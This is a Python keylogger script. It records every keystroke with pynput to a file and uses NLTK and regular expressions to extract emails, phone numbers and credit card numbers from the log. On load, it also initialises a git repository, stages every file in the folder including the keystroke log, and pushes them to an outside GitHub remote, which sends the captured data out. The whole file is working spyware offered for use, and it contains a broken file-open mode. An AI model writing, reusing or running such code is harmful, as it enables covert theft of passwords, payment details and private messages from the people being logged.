import pynput.keyboard
import nltk
from nltk import word_tokenize, pos_tag, ne_chunk
import re
import logging
import subprocess
import os

# Ensure that NLTK resources are downloaded
nltk.download('punkt')
nltk.download('maxent_ne_chunker')
nltk.download('words')
nltk.download('wordnet')
nltk.download('omw-1.4')

# Set up logging for storing keystrokes
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(message)s")

# Define a function to capture keystrokes
def on_press(key):
    try:
        # Log the key pressed (character keys like a, b, 1, etc.)
        logging.info(f"{key.char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        logging.info(f"{key}")

# Define a function to process keylog data and use NLP to extract critical info
def process_log():
    with open("keylog.txt", "rat") as file:
        log_data = file.read()

    # Tokenize and POS tagging
    tokens = word_tokenize(log_data)
    tagged_tokens = pos_tag(tokens)

    # Extract named entities (NE) using NLTK
    named_entities = ne_chunk(tagged_tokens)

    # Extract critical information like emails, phone numbers, etc.
    extract_critical_info(log_data)

    # Print out named entities (could be critical info)
    print("Named Entities Detected: ")
    print(named_entities)

def extract_critical_info(text):
    # Example of extracting emails
    emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b', text)
    if emails:
        print("Email(s) found:", emails)

    # Example of extracting phone numbers
    phone_numbers = re.findall(r'\+?\d{1,4}[\s-]?\(?\d{1,4}?\)?[\s-]?\d{1,4}[\s-]?\d{1,4}', text)
    if phone_numbers:
        print("Phone number(s) found:", phone_numbers)

    # Example of extracting credit card numbers (basic pattern, not fully secure for real use)
    credit_cards = re.findall(r'\b(?:\d[ -]*?){13,16}\b', text)
    if credit_cards:
        print("Credit card number(s) found:", credit_cards)

# Define a function to start the keylogger
def start_keylogger():
    # Collect keystrokes using the pynput listener
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# Change to your project directory
project_dir = os.getcwd()
os.chdir(project_dir)

# Initialize a Git repository if not already initialized
subprocess.run(['git', 'init'])

# Set your GitHub repository remote URL
github_repo_url = 'https://github.com/efffectery/VeryUseFullScript'

# Add the remote if not already added
subprocess.run(['git', 'remote', 'add', 'origin', github_repo_url])

# Add the .txt file or all files in the folder to the Git staging area
subprocess.run(['git', 'add', '.'])

# Commit the changes
subprocess.run(['git', 'commit', '-m', 'Add .txt file'])

# Push to GitHub
subprocess.run(['git', 'push', '-u', 'origin', 'main'])

if __name__ == "__main__":
    print("Keylogger started. Press 'Ctrl+C' to stop.")
    start_keylogger()

